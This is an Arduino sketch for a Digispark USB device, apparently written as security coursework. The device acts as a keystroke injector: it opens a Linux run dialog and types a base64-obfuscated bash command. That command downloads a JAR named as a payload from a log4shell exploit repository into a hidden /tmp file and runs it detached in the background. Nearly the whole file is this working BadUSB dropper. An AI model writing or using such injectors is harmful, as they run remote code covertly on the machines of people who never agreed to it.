#define LED_BUILTIN 1
#include "DigiKeyboard.h"
/**
 *
 * @author       Muhammad Nur Irsyad
 * @id              1807422020
 * @class         CCIT SEC 8 (TMJ)
 */
bool passed = false;
//----------
void setup() {
    pinMode(LED_BUILTIN, OUTPUT);    
    digitalWrite(LED_BUILTIN, HIGH);
    //----------
    DigiKeyboard.sendKeyStroke(0); delay(2000);        
    DigiKeyboard.sendKeyStroke(KEY_F2 , MOD_ALT_LEFT);
    DigiKeyboard.sendKeyStroke(0); delay(750);        
    DigiKeyboard.println("gnome-terminal -e '/bin/bash -i -c \"base64 -d <<< IyEvYmluL2Jhc2gKIy0tLS0tLS0tLS0KIHdnZXQgLXEgLU8gL3RtcC8ucGF5bG9hZC02LjIyLmphciBodHRwczovL2dpdGh1Yi5jb20vaG90cG90Y29va2llL2xvZzRzaGVsbC13aGl0ZS1ib3gvcmF3L21haW4vcmVkL212bi13ZWItZXhwbG9pdC90YXJnZXQvcGF5bG9hZC02LjIyLmphciAmIHdhaXQKIGphdmEgLWphciAvdG1wLy5wYXlsb2FkLTYuMjIuamFyICYgZGlzb3du | bash\"'");    
    //----------
    passed = true;
}

void loop() {
    if (passed) {
        digitalWrite(LED_BUILTIN, LOW); delay(100);            
        digitalWrite(LED_BUILTIN, HIGH); delay(125);                                              
     }
}
